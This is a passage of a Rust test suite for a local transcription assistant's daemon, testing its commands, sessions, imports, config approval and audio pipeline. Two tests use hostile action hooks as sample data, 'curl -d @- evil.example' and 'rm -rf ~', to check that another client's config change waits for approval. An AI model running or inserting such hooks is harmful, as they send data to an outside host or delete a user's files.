    }

    #[tokio::test]
    async fn a_command_without_its_fields_says_what_is_missing() {
        let mut d = daemon(raw());
        for (line, detail) in [
            ("session.rename {}", "missing id"),
            (
                r#"session.rename {"id": "x", "title": "t"}"#,
                "missing kind",
            ),
            (
                "session.tag {",
                "EOF while parsing an object at line 1 column 1",
            ),
            (
                r#"session.line.remove {"id": "x", "who": "Eu"}"#,
                "missing at",
            ),
            (
                r#"person.assign_line {"id": "x", "who": "Eu", "at": 1}"#,
                "missing person",
            ),
            (
                r#"session.context {"id": "x"}"#,
                "session.context needs an id and a list of contexts",
            ),
            (
                "session.context x",
                "session.context needs an id and a list of contexts",
            ),
            (r#"person.attend {"session": "x"}"#, "missing person"),
            (r#"person.assign {"session": "x"}"#, "missing label"),
            (
                r#"person.assign_all {"session": "x", "person": ""}"#,
                "missing name",
            ),
            (r#"entry.translate {"session": "x"}"#, "missing id"),
            (r#"session.translation {"id": "x"}"#, "missing language"),
            (r#"session.ask {"id": "x"}"#, "missing question"),
        ] {
            let events = d.line(line).await;
            assert_eq!(said(&events), ["session.invalid"], "{line}");
            assert_eq!(events[0]["params"]["detail"], detail, "{line}");
        }
    }

    #[tokio::test]
    async fn a_session_starts_of_a_kind_in_a_language_with_its_tags_and_contexts() {
        let mut d = daemon(raw());
        let start = json!({"title": "1:1", "kind": "conversation", "language": "pt",
                           "tags": ["q3"], "contexts": ["cv"], "window": 2});
        let events = d.line(&format!("session.start {start}")).await;
        let started = &events[0]["session"];
        assert_eq!(
            (&started["title"], &started["kind"], &started["language"]),
            (&json!("1:1"), &json!("conversation"), &json!("pt"))
        );
        assert_eq!(started["contexts"], json!(["cv"]));
        let last = events.last().unwrap();
        assert_eq!(
            *last,
            json!({"type": "session_opened", "id": started["id"], "window": 2})
        );
        let tagged = events.iter().find(|e| e["type"] == "session_tags").unwrap();
        assert_eq!(tagged["tags"], json!(["q3"]));
        // The first kind by default, and no window told without one.
        let events = d.line(r#"session.start {"language": "en"}"#).await;
        assert_eq!(said(&events), ["session"]);
        assert_eq!(events[0]["session"]["kind"], "meeting");
        assert_eq!(events[0]["session"]["contexts"], Value::Null);
        for (start, detail) in [
            ("{", "EOF while parsing an object at line 1 column 1"),
            (r#"{"title": "x"}"#, "missing language"),
            (
                r#"{"language": "pt", "kind": "party"}"#,
                "unknown kind \"party\"",
            ),
            (r#"{"language": 5}"#, "no language \"5\""),
        ] {
            let events = d.line(&format!("session.start {start}")).await;
            assert_eq!(said(&events), ["session.invalid"], "{start}");
            assert_eq!(events[0]["params"]["detail"], detail, "{start}");
        }
    }

    #[tokio::test]
    async fn the_config_and_the_devices_are_listed_on_demand() {
        let mut d = daemon(raw());
        d.line("config").await;
        let config = d.until(|event| event["type"] == "config").await;
        assert_eq!(config["config"], d.session.current.to_value());
        assert_eq!(config["devices"][2]["id"], "usb-mic");
        assert_eq!(config["presets"], presets());
        assert_eq!(config["omapass"]["page"], omapass::PAGE);
        d.line("devices").await;
        let devices = d.until(|event| event["type"] == "devices").await;
        assert_eq!(devices["devices"], config["devices"]);
    }

    #[test]
    fn omapass_lists_its_accounts_or_says_why_not() {
        let account = omapass::Account {
            account: "openrouter".into(),
            folder: "eco".into(),
        };
        assert_eq!(
            omapass_listed(Ok(vec![account]), || unreachable!()),
            json!({"type": "omapass", "installed": true,
                   "accounts": [{"account": "openrouter", "folder": "eco"}]})
        );
        assert_eq!(
            omapass_listed(Err("omapass is not installed".into()), || false),
            json!({"type": "omapass", "installed": false, "accounts": []})
        );
        assert_eq!(
            omapass_listed(Err("locked".into()), || true),
            json!({"type": "omapass", "installed": true, "accounts": [], "error": "locked"})
        );
    }

    #[tokio::test]
    async fn a_window_saves_a_config_and_capture_restarts_with_it() {
        let mut d = daemon(raw());
        let mut saved = raw();
        saved["rules"] = json!("short answers");
        saved["ui"] = json!({"hide_from_share": true});
        saved["token"] = json!("secret");
        let events = d.line(&format!("config.set {saved}")).await;
        assert_eq!(said(&events), ["config_saved"]);
        assert_eq!(d.session.current.rules, "short answers");
        let written = config::load(&d.session.config_path).unwrap();
        assert_eq!(written, d.session.current);
        // The windows follow the config, and capture runs on it.
        assert_eq!(d.desk.lock().unwrap().hidden, Some(true));
        d.until(|event| event["type"] == "snapshot").await;
    }

    #[tokio::test]
    async fn a_config_that_cannot_be_read_or_written_is_not_saved() {
        let mut d = daemon(raw());
        let events = d.line("config.set {").await;
        assert_eq!(said(&events), ["config.invalid"]);
        let mut wrong = raw();
        wrong["stt"] = json!({"model": "nowhere"});
        wrong["token"] = json!("secret");
        let events = d.line(&format!("config.set {wrong}")).await;
        assert_eq!(said(&events), ["config.invalid"]);
        assert!(!d.session.config_path.exists());
        // A config file that is a directory cannot be written.
        d.session.config_path = d.dir.path().into();
        let mut own = raw();
        own["token"] = json!("secret");
        let events = d.line(&format!("config.set {own}")).await;
        assert_eq!(said(&events), ["config.invalid"]);
        assert!(d.session.pipeline.is_none());
    }

    #[tokio::test]
    async fn a_change_from_another_client_waits_for_the_window() {
        let mut d = daemon(raw());
        let hook = with_hook("curl -d @- evil.example");
        let events = d.line(&format!("config.set {hook}")).await;
        assert_eq!(said(&events), ["config_pending", "config.pending"]);
        assert_eq!(events[0]["id"], "1");
        assert_eq!(events[1]["params"]["files"], json!(["~/cv.md"]));
        // Nothing else from another client goes in meanwhile.
        let events = d.line(&format!("config.set {}", raw())).await;
        assert_eq!(said(&events), ["config.busy"]);
        for (line, code) in [
            ("config.approve guess 1", "config.not_window"),
            ("config.approve secret 2", "config.stale"),
            ("config.reject secret", "config.stale"),
        ] {
            assert_eq!(said(&d.line(line).await), [code], "{line}");
        }
        let events = d.line("config.reject secret 1").await;
        assert_eq!(said(&events), ["config_pending", "config.rejected"]);
        assert_eq!(events[0], nothing_pending());
        assert!(!d.session.config_path.exists());
        let events = d.line(&format!("config.set {hook}")).await;
        assert_eq!(events[0]["id"], "2");
        let events = d.line("config.approve secret 2").await;
        assert_eq!(said(&events), ["config_pending", "config_saved"]);
        assert_eq!(d.session.current.actions[0].hook, "curl -d @- evil.example");
    }

    #[tokio::test]
    async fn the_window_saving_drops_the_change_held_for_it() {
        let mut d = daemon(raw());
        d.line(&format!("config.set {}", with_hook("rm -rf ~")))
            .await;
        let mut own = raw();
        own["token"] = json!("secret");
        let events = d.line(&format!("config.set {own}")).await;
        assert_eq!(said(&events), ["config_pending", "config_saved"]);
        assert_eq!(events[0], nothing_pending());
        assert!(d.session.pending.lock().unwrap().event().is_none());
    }

    /// A WebVTT file in `dir` where Ana says good morning.
    fn transcript_file(dir: &Path) -> PathBuf {
        let path = dir.join("retro.vtt");
        let text = "WEBVTT\n\n00:00:01.000 --> 00:00:03.000\n<v Ana>Bom dia a todos\n";
        std::fs::write(&path, text).unwrap();
        path
    }

    #[tokio::test]
    async fn an_imported_file_becomes_a_session_that_exports_its_lines() {
        let mut d = daemon(raw());
        let path = transcript_file(d.dir.path());
        let import = json!({"path": path, "started_at": 1_790_000_000.0});
        d.line(&format!("session.import {import}")).await;
        let started = d.until(|event| event["type"] == "import_started").await;
        let session = &started["session"];
        assert_eq!(
            (&session["title"], &session["kind"], &session["started_at"]),
            (&json!("retro"), &json!("meeting"), &json!(1_790_000_000.0))
        );
        d.until(|event| event["type"] == "import_done").await;
        let id = session["id"].as_str().unwrap();
        let events = d.line(&format!("session.export {id}")).await;
        let text = events[0]["text"].as_str().unwrap();
        assert!(text.contains("Bom dia a todos"), "{text}");
    }

    #[tokio::test]
    async fn an_import_that_cannot_start_says_why() {
        let mut raw = raw();
        raw["models"][0]["base_url"] = json!("ws://127.0.0.1:1/listen");
        let mut d = daemon(raw);
        let path = transcript_file(d.dir.path());
        for (import, code, detail) in [
            (
                "{".to_string(),
                "session.invalid",
                "EOF while parsing an object at line 1 column 1",
            ),
            (
                json!({"path": " "}).to_string(),
                "import.failed",
                "no file \"\"",
            ),
            (
                json!({"path": path, "kind": "party", "language": "pt"}).to_string(),
                "import.failed",
                "unknown kind \"party\" or language \"pt\"",
            ),
        ] {
            let events = d.line(&format!("session.import {import}")).await;
            assert_eq!(said(&events), [code], "{import}");
            assert_eq!(events[0]["params"]["detail"], detail, "{import}");
        }
        // A model that cannot be had fails the import before any session exists.
        d.line(&format!("session.import {}", json!({"path": path})))
            .await;
        let failed = d.until(|event| event["code"] == "import.failed").await;
        let detail = "no streaming transcription known at ws://127.0.0.1:1/listen";
        assert_eq!(failed["params"]["detail"], detail);
    }

    #[tokio::test]
    async fn one_import_runs_at_a_time_until_it_is_cancelled() {
        let mut d = daemon(raw());
        d.session.importing = Some(tokio::spawn(std::future::pending()));
        let path = transcript_file(d.dir.path());
        let import = format!("session.import {}", json!({"path": path}));
        assert_eq!(said(&d.line(&import).await), ["import.busy"]);
        d.line("import.cancel").await;
        assert!(d.session.importing.is_none());
        d.line(&import).await;
        d.until(|event| event["type"] == "import_done").await;
    }

    #[tokio::test]
    async fn the_date_of_a_file_is_read_apart() {
        let mut d = daemon(raw());
        d.line("import.date  /nowhere/retro.mp4").await;
        let date = d.until(|event| event["type"] == "import_date").await;
        assert_eq!(
            date,
            json!({"type": "import_date", "path": "/nowhere/retro.mp4", "at": null})
        );
    }

    #[tokio::test]
    async fn opening_the_app_again_opens_a_window_on_a_session_no_window_shows() {
        let mut d = daemon(raw());
        let first = d.start("Retro").await;
        let second = d.start("1:1").await;
        for _ in 0..3 {
            let events = d.line("overlay.open").await;
            assert_eq!(events, [json!({"type": "overlay_status", "open": true})]);
        }
        assert_eq!(
            d.asked(),
            [
                format!("open {second} "),
                format!("open {first} "),
                "open  ".into()
            ]
        );
        assert!(d.session.overlay_open.load(Ordering::Relaxed));
        d.desk.lock().unwrap().refuse = true;
        let events = d.line("overlay.open").await;
        assert_eq!(
            events,
            [
                json!({"type": "overlay_status", "open": false, "message": "eco-window exited with 1"})
            ]
        );
    }

    #[tokio::test]
    async fn a_shortcut_goes_to_the_newest_window_or_opens_one_to_make_it() {
        let mut d = daemon(raw());
        let events = d
            .line(r#"window.call {"call": "import", "path": "/tmp/retro.vtt"}"#)
            .await;
        assert_eq!(said(&events), ["overlay_status"]);
        assert_eq!(
            d.asked(),
            [r#"open  {"call":"import","path":"/tmp/retro.vtt"}"#]
        );
        let events = d.line(r#"window.call {"call": "config"}"#).await;
        assert_eq!(
            events,
            [json!({"type": "window_call", "window": 1, "call": "config"})]
        );
        assert!(d.line(r#"window.call {"call": "focus"}"#).await.is_empty());
        // A window that cannot take the keyboard is still asked.
        d.desk.lock().unwrap().refuse = true;
        let events = d.line(r#"window.call {"call": "sessions"}"#).await;
        assert_eq!(
            events,
            [json!({"type": "window_call", "window": 1, "call": "sessions"})]
        );
        assert_eq!(d.asked()[1..], ["focus 1", "focus 1", "focus 1"]);
        let events = d.line(r#"window.call {"call": "quit"}"#).await;
        assert_eq!(said(&events), ["command.unknown"]);
    }

    #[tokio::test]
    async fn a_window_says_what_it_shows_and_that_session_is_addressed() {
        let mut d = daemon(raw());
        let first = d.start("Retro").await;
        let second = d.start("1:1").await;
        d.line("overlay.open").await;
        let events = d
            .line(&format!(
                r#"window.show {{"window": 1, "session": "{first}"}}"#
            ))
            .await;
        assert_eq!(events[0]["session"]["id"], first);
        assert_eq!(d.desk.lock().unwrap().open, [(1, first.clone())]);
        let events = d.line(r#"window.show {"window": 1, "session": ""}"#).await;
        assert!(events.is_empty());
        assert_eq!(d.desk.lock().unwrap().open, [(1, String::new())]);
        assert!(d.line("window.show 1").await.is_empty());
        // The next window opens on the session the first stopped showing.
        d.line("overlay.open").await;
        assert_eq!(d.asked().last().unwrap(), &format!("open {first} "));
        assert_ne!(first, second);
    }

    #[tokio::test]
    async fn the_daemon_greets_a_client_with_what_it_needs_first() {
        let d = daemon(raw());
        d.session.overlay_open.store(true, Ordering::Relaxed);
        let greeting = greeting(
            d.session.assistant.clone(),
            Arc::clone(&d.session.overlay_open),
            Outages::default(),
            Arc::clone(&d.session.pending),
        );
        let events = greeting();
        assert_eq!(said(&events), ["daemon", "snapshot"]);
        assert_eq!(events[0]["overlay"], true);
        assert_eq!(events[0]["version"], env!("CARGO_PKG_VERSION"));
        let held = hold(&mut d.session.pending.lock().unwrap(), "notify-send done");
        assert_eq!(greeting()[2], held);
    }

    #[tokio::test]
    async fn stop_ends_the_daemon_and_closes_its_windows() {
        let Daemon {
            session,
            desk,
            exits,
            ..
        } = daemon(raw());
        let open = Arc::clone(&session.overlay_open);
        let (lines, received) = mpsc::unbounded_channel();
        let served = tokio::spawn(session.serve(received, std::future::pending()));
        lines.send("overlay.open".into()).unwrap();
        let opened = || open.load(Ordering::Relaxed);
        eventually(opened).await;
        // A window that exits is no longer open.
        exits
            .send(std::os::unix::process::ExitStatusExt::from_raw(256))
            .unwrap();
        eventually(|| !opened()).await;
        lines.send("stop".into()).unwrap();
        served.await.unwrap();
        assert_eq!(desk.lock().unwrap().asked, ["open  ", "close"]);
    }

    #[tokio::test]
    async fn a_signal_stops_capture_and_the_import() {
        let mut d = daemon(raw());
        d.configured().await;
        let import = tokio::spawn(std::future::pending());
        d.session.importing = Some(import);
        let (_lines, received) = mpsc::unbounded_channel();
        d.session.serve(received, async {}).await;
        assert_eq!(d.desk.lock().unwrap().asked, ["close"]);
    }

    /// Wait until `done`.
    async fn eventually(done: impl Fn() -> bool) {
        let deadline = std::time::Instant::now() + Duration::from_secs(20);
        while !done() {
            assert!(std::time::Instant::now() < deadline, "never done");
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
    }

    #[tokio::test]
    async fn models_list_what_a_provider_offers() {
        let listed = br#"{"data": [{"id": "m2"}, {"id": "m1"}]}"#.to_vec();
        let (base, seen) = http::testing::serve_once(200, listed).await;
        let request = json!({"target": "llm", "base_url": base});
        let answer = models(&request.to_string(), &[]).await;
        assert_eq!(
            answer,
            json!({"type": "models", "target": "llm", "models": ["m1", "m2"]})
        );
        assert!(seen.lock().unwrap().head.starts_with("GET /v1/models "));
        // Deepgram says which of its models stream.
        let listed = br#"{"stt": [{"canonical_name": "nova-3", "streaming": true},
                                  {"canonical_name": "whisper", "streaming": false}]}"#;
        let (base, seen) = http::testing::serve_once(200, listed.to_vec()).await;
        let deepgram = base.replace("http://", "ws://") + "/deepgram.com/listen";
        let request = json!({"target": "stt", "base_url": deepgram});
        let answer = models(&request.to_string(), &[]).await;
        assert_eq!(answer["models"], json!(["nova-3"]));
        assert!(
            seen.lock()
                .unwrap()
                .head
                .starts_with("GET /v1/deepgram.com/models ")
        );
        // ElevenLabs lists none: its models are known.
        let request = json!({"target": "stt", "base_url": "wss://api.elevenlabs.io/v1/speech-to-text/realtime"});
        let answer = models(&request.to_string(), &[]).await;
        assert_eq!(answer["models"], json!(stt_elevenlabs::MODELS));
    }

    #[tokio::test]
    async fn models_say_why_they_cannot_be_listed() {
        let request = json!({"base_url": "http://10.0.0.5:8000/v1"});
        let answer = models(&request.to_string(), &[]).await;
        assert_eq!(answer["error"], "missing target");
        assert_eq!(answer["target"], "");
        let request = json!({"target": "llm", "base_url": "http://10.0.0.5:8000/v1", "api_key_env": "LAN_KEY"});
        let answer = models(&request.to_string(), &saved_models()).await;
        assert_eq!(answer["error"], "LAN_KEY is not set");
        let mut d = daemon(raw());
        d.line(&format!("models {}", json!({"target": "chat"})))
            .await;
        let answer = d.until(|event| event["type"] == "models").await;
        assert_eq!(answer["error"], "missing base_url");
    }

    #[tokio::test]
    async fn every_kind_of_transcription_model_is_built_for_live_audio_or_a_file() {
        let model = |base_url: &str, key: Option<&str>| -> ModelConfig {
            serde_json::from_value(json!({"name": "t", "type": "transcription",
                "base_url": base_url, "model": "x", "api_key_env": key}))
            .unwrap()
        };
        let built = |stt: Result<Stt, String>| match stt {
            Ok(Stt::Segments(_)) => "segments".to_string(),
            Ok(Stt::Stream(_)) => "stream".to_string(),
            Err(reason) => reason,
        };
        let deepgram = model("wss://api.deepgram.com/v1/listen", None);
        let cases = [
            (
                model("https://api.groq.com/openai/v1/", None),
                false,
                "segments",
            ),
            (deepgram.clone(), false, "stream"),
            (deepgram, true, "segments"),
            (
                model("wss://api.elevenlabs.io/v1/speech-to-text/realtime", None),
                true,
                "stream",
            ),
            (
                model("ws://lan:9000", None),
                false,
                "no streaming transcription known at ws://lan:9000",
            ),
            (
                model("http://lan", Some("ECO_TEST_UNSET_KEY")),
                false,
                "ECO_TEST_UNSET_KEY is not set",
            ),
        ];
        for (stt, file, expected) in cases {
            assert_eq!(
                built(Stt::build(&stt, "pt", file).await),
                expected,
                "{}",
                stt.base_url
            );
        }
    }

    #[tokio::test]
    async fn the_setup_tells_each_part_that_cannot_be_had_and_the_rest_works() {
        let mut raw = raw();
        raw["models"] = json!([
            {"name": "w", "type": "transcription", "base_url": "ws://127.0.0.1:1/listen", "model": "x"},
            {"name": "m", "type": "chat", "base_url": "http://127.0.0.1:1/v1", "model": "m",
             "api_key_env": "ECO_TEST_UNSET_KEY"},
        ]);
        raw["context"] = json!({"files": ["/nowhere/eco/cv.md"]});
        raw["contexts"] = json!([{"name": "notes", "files": ["/nowhere/eco/notes.md"]}]);
        let mut d = daemon(raw);
        d.configured().await;
        let problems = d.events.lock().unwrap().clone();
        assert_eq!(
            said(&problems),
            [
                "input.disconnected",
                "snapshot",
                "stt.unavailable",
                "model.unavailable",
                "context.unavailable",
                "context.unavailable"
            ]
        );
        let detail = "w: no streaming transcription known at ws://127.0.0.1:1/listen";
        assert_eq!(problems[2]["params"]["detail"], detail);
        assert_eq!(
            problems[3]["params"],
            json!({"name": "m", "detail": "ECO_TEST_UNSET_KEY is not set"})
        );
        assert!(
            problems[5]["message"]
                .as_str()
                .unwrap()
                .starts_with("context notes: ")
        );
        // A session still starts and is listed with what it would be transcribed by.
        let id = d.start("Retro").await;
        let events = d.line(&format!("session.show {id}")).await;
        assert_eq!(said(&events), ["session_detail"]);
    }

    #[tokio::test]
    async fn each_kind_runs_on_its_models() {
        let mut raw = raw();
        let models = raw["models"].as_array_mut().unwrap();
        models.push(json!({"name": "dg", "type": "transcription", "base_url": "wss://api.deepgram.com/v1/listen",
                           "model": "nova-3", "api_key_env": "CARGO_PKG_NAME", "kinds": ["idea"]}));
        models.push(
            json!({"name": "fast", "type": "chat", "base_url": "http://127.0.0.1:1/v1",
                           "model": "f", "kinds": ["idea"], "translates": ["idea"]}),
        );
        raw["reviewer"] = json!({"enabled": true, "model": "fast"});
        raw["actions"] = json!([{"name": "probe", "prompt": "p", "format": "f", "model": "fast"}]);
        let mut d = daemon(raw);
        let snapshot = d.configured().await;
        assert_eq!(
            snapshot["kind_models"],
            json!({
                "meeting": {"transcription": "w", "chat": "m"},
                "conversation": {"transcription": "w", "chat": "m"},
                "other": {"transcription": "w", "chat": "m"},
                "idea": {"transcription": "dg", "chat": "fast"},
            })
        );
        assert_eq!(snapshot["actions"], json!(["probe"]));
    }

    #[tokio::test]
    async fn a_question_is_answered_by_the_configured_model() {
        let delta = json!({"choices": [{"delta": {"content": "Kafka."}}]});
        let reply = format!("data: {delta}\n\ndata: [DONE]\n\n");
        let (base, seen) =
            http::testing::serve_once_as(200, Some("text/event-stream"), reply.into_bytes()).await;
        let mut raw = raw();
        raw["models"][1]["base_url"] = json!(base);
        let mut d = daemon(raw);
        d.configured().await;
        d.start("Retro").await;
        d.line("ask which queue?").await;
        let done = d.until(|event| event["type"] == "suggestion_end").await;
        let answer = d.until(|event| event["type"] == "suggestion_delta").await;
        assert_eq!(
            (&answer["id"], &answer["text"]),
            (&done["id"], &json!("Kafka."))
        );
        assert!(
            seen.lock()
                .unwrap()
                .head
                .starts_with("POST /v1/chat/completions ")
        );
        // The setup offers its languages; a session moves to one of them.
        let id = d.start("1:1").await;
        let events = d
            .line(&format!(
                r#"session.language {{"id": "{id}", "language": "EN"}}"#
            ))
            .await;
        assert_eq!(events[0]["session"]["language"], "en");
        let line = format!(r#"session.translation {{"id": "{id}", "language": " pt"}}"#);
        let events = d.line(&line).await;
        assert_eq!(events.last().unwrap()["translating"], "pt");
        let line =
            format!(r#"entry.translate {{"session": "{id}", "id": "e1", "language": " pt"}}"#);
        let events = d.line(&line).await;
        assert_eq!(said(&events), ["answer.not_found"]);
    }

    #[tokio::test]
    async fn a_replay_that_cannot_be_read_is_reported() {
        let mut d = daemon(raw());
        d.session.rig.replay = Some(d.dir.path().join("call.wav"));
        let snapshot = d.configured().await;
        assert_eq!(snapshot["inputs"][0]["label"], "call.wav");
        let stopped = d.until(|event| event["code"] == "capture.stopped").await;
        assert!(
            stopped["message"].as_str().unwrap().contains("call.wav"),
            "{stopped}"
        );
    }

    /// A diarizer that counts the regions it is sent, then finds `found`.
    fn diarizer(regions: Arc<Mutex<usize>>, found: Result<Diarization, String>) -> Diarizer {
        let found = Mutex::new(Some(found));
        Arc::new(move |tell: Found| {
            let (sender, received) = std::sync::mpsc::channel::<Segment>();
            let regions = Arc::clone(&regions);
            let found = found.lock().unwrap().take().expect("one diarizer");
            std::thread::spawn(move || {
                *regions.lock().unwrap() = received.iter().count();
                tell(found);
            });
            Some(sender)
        })
    }

    #[tokio::test]
    async fn a_recording_cancels_echo_and_tells_the_voices_of_the_others_apart() {
        let mut raw = raw();
        raw["audio"] = json!({"echo_cancel": true});
        raw["models"][0]["base_url"] = json!("ws://127.0.0.1:1/listen");
        let audio = Arc::new(FakeAudio {
            speech: true,
            ..FakeAudio::default()
        });
        let regions = Arc::new(Mutex::new(0));
        let found = Err("the diarizer exited".to_string());
        let audio_seen = Arc::clone(&audio);
        let mut d = daemon_on(raw, audio, diarizer(Arc::clone(&regions), found));
        // Recording from the start, so the clips are heard by the capture.
        d.start("Retro").await;
        d.configured().await;
        let failed = d.until(|event| event["code"] == "diarization.failed").await;
        assert_eq!(failed["params"]["detail"], "the diarizer exited");
        assert!(*regions.lock().unwrap() > 0);
        assert_eq!(
            *audio_seen.captured.lock().unwrap(),
            [
                "cancelled",
                "@default-input",
                "@default-output",
                "echo @default-input"
            ]
        );
        d.until(|event| event["type"] == "signal" && event["input"] == "@default-output")
            .await;
    }

    #[tokio::test]
    async fn a_microphone_whose_echo_cannot_be_cancelled_is_heard_as_it_is() {
        let mut raw = raw();
        raw["audio"] = json!({"echo_cancel": true});
        let audio = Arc::new(FakeAudio {
            echo_fails: true,
            ..FakeAudio::default()
        });
        let mut d = daemon_on(raw, audio, no_diarizer());
        d.start("Retro").await;
        d.configured().await;
        let failed = d.until(|event| event["code"] == "echo_cancel.failed").await;
        assert_eq!(failed["params"]["detail"], "no echo-cancel module");
    }

    /// Hears `words` in every clip, billed under the request "r1".
    struct Says(&'static str);

    impl SpeechToText for Says {
        fn transcribe<'a>(
            &'a self,
            pcm: &'a [i16],
        ) -> BoxFuture<'a, Result<crate::ports::Transcript, TranscriptionError>> {
            let end = pcm.len() as f64 / 16_000.0;
            let phrases = vec![crate::ports::Phrase {
                start: 0.0,
                end,
                text: self.0.into(),
            }];
            let request = Some("r1".to_string());
            Box::pin(async move { Ok(crate::ports::Transcript { phrases, request }) })
        }
    }

    /// Streams the request "r2", a partial, then a phrase, once a frame comes.
    struct Streams;

    impl StreamingSpeechToText for Streams {
        fn transcribe<'a>(
            &'a self,
            frames: stream::BoxStream<'a, Frame>,
        ) -> stream::BoxStream<'a, Result<Heard, TranscriptionError>> {
            let phrase = crate::ports::Phrase {
                start: 0.0,
                end: 1.0,
                text: "bom dia".into(),
            };
            let heard = [
                Heard::Request("r2".into()),
                Heard::Partial("bom".into()),
                Heard::Phrase(phrase),
            ];
            frames
                .take(1)
                .flat_map(move |_| stream::iter(heard.clone().map(Ok)))
                .boxed()
        }
    }

    /// One second of speech captured at the start of the input.
    fn segment() -> Captured {
        let segment = Segment {
            pcm: vec![0; 16_000],
            start: 0,
        };
        Captured::Segment(segment, tokio::time::Instant::now())
    }

    #[tokio::test]
    async fn what_a_transcriber_hears_goes_to_the_sessions_listening() {
        let mut d = daemon(raw());
        d.configured().await;
        let id = d.start("Retro").await;
        let (assistant, emit) = (d.session.assistant.clone(), Arc::clone(&d.session.emit));
        let outages = Outages::default();
        let (capture, _segments) = transcribing(
            Stt::Segments(Box::new(Says("olá"))),
            &assistant,
            &emit,
            &outages,
        );
        capture.send(segment());
        let line = d.until(|event| event["type"] == "transcript").await;
        assert_eq!(
            (&line["session"], &line["who"], &line["text"]),
            (&json!(id), &json!("Eles"), &json!("olá"))
        );
        let (capture, _streamed) =
            transcribing(Stt::Stream(Box::new(Streams)), &assistant, &emit, &outages);
        capture.send(Captured::Frame(0, vec![0; FRAME_SAMPLES]));
        let partial = d.until(|event| event["type"] == "transcript_partial").await;
        assert_eq!(
            (&partial["session"], &partial["text"]),
            (&json!(id), &json!("bom"))
        );
        d.until(|event| event["text"] == "bom dia").await;
    }

    #[tokio::test]
    async fn the_lines_a_live_input_became_get_the_voices_found() {
        let mut d = daemon(raw());
        d.configured().await;
        let id = d.start("Retro").await;
        let (assistant, emit) = (d.session.assistant.clone(), Arc::clone(&d.session.emit));
        let regions = Arc::new(Mutex::new(0));
        let found = Diarization {
            turns: vec![crate::domain::diarization::Turn {
                start: 0.0,
                end: 60.0,
                speaker: 0,
            }],
            voices: vec![vec![1.0; 4]],
        };
        let diarizer = diarizer(Arc::clone(&regions), Ok(found));
        let voices = voices(&assistant, &emit, "Eles", &diarizer).unwrap();
        let mut hub = Hub::default();
        let capture = hub.input("mic");
        let cell: Ready = Arc::new(OnceCell::new_with(Some(Ok(Stt::Segments(Box::new(Says(
            "olá",
        )))))));
        let listening = Listening {
            model: "w".into(),
            language: "pt".into(),
        };
        let heard = tokio::spawn(transcriber(
            "Eles".into(),
            hub.read("mic").unwrap(),
            (Arc::default(), cell),
            listening,
            assistant,
            (emit, Outages::default()),
            Some(Arc::clone(&voices.lines)),
        ));
        voices
            .regions
            .send(Segment {
                pcm: vec![0; 16_000],
                start: 0,
            })
            .unwrap();
        capture.send(segment());
        drop(capture);
        heard.await.unwrap();
        assert_eq!(voices.lines.lock().unwrap().len(), 1);
        drop(voices);
        let diarized = d.until(|event| event["type"] == "diarized").await;
        assert_eq!(
            (&diarized["session"], &diarized["who"]),
            (&json!(id), &json!(["Eles"]))
        );
        assert_eq!(*regions.lock().unwrap(), 1);
    }

    #[tokio::test]
    async fn a_model_that_is_not_registered_is_told_and_nothing_is_transcribed() {
        let dir = tempfile::tempdir().unwrap();
        let (emit, events) = recorder();
        let assistant = assistant(&emit, dir.path());
        let mut hub = Hub::default();
        let _capture = hub.input("mic");
        let listening = Listening {
            model: "gone".into(),
            language: "pt".into(),
        };
        transcriber(
            "Eles".into(),
            hub.read("mic").unwrap(),
            (Arc::default(), Ready::default()),
            listening,
            assistant,
            (emit, Outages::default()),
            None,
        )
        .await;
        let reason = "gone: not a registered transcription model";
        assert_eq!(
            *events.lock().unwrap(),
            [error(
                "stt.unavailable",
                format!("transcription: {reason}"),
                json!({"detail": reason})
            )]
        );
    }

    /// A source that never ends.
    struct Endless;

    impl AudioSource for Endless {
        fn frames(&mut self) -> stream::BoxStream<'_, Result<Frame, AudioError>> {
            stream::pending().boxed()
        }
    }

    #[tokio::test(start_paused = true)]
    async fn a_recording_capture_follows_the_sessions_until_none_can_record() {
        let dir = tempfile::tempdir().unwrap();
        let (emit, events) = recorder();
        let mic = Input {
            id: "mic".into(),
            label: "Mic".into(),
            participant: "Eu".into(),
            user: true,
            color: None,
            source: Box::new(Endless),
            cancelled: None,
        };
        let mut channels = Channels {
            inputs: vec![mic],
            audio: Arc::new(FakeAudio::default()),
            models: Arc::default(),
            built: Built::default(),
            assistant: assistant(&emit, dir.path()),
            emit,
            vad: vad(),
            diarizer: no_diarizer(),
            outages: Outages::default(),
        };
        let (recording, listening) = watch::channel(BTreeSet::new());
        let sessions = async {
            tokio::time::sleep(Duration::from_millis(10)).await;
            // A session starts listening with a model no one registered.
            recording.send_replace(self::listening(&["gone"]));
            tokio::time::sleep(Duration::from_millis(10)).await;
            drop(recording);
        };
        let (ran, ()) = tokio::join!(channels.run(Some(listening)), sessions);
        assert!(ran.is_ok());
        let unavailable = events.lock().unwrap()[0]["code"].clone();
        assert_eq!(unavailable, "stt.unavailable");
    }

    #[tokio::test]
    async fn a_line_command_missing_several_fields_is_refused_once() {
        let mut d = daemon(raw());
        for line in [
            r#"session.line.edit {"id": "x"}"#,
            r#"person.assign_line {"id": "x"}"#,
        ] {
            let events = d.line(line).await;
            assert_eq!(said(&events), ["session.invalid"], "{line}");
            assert_eq!(events[0]["params"]["detail"], "missing who", "{line}");
        }
    }
}
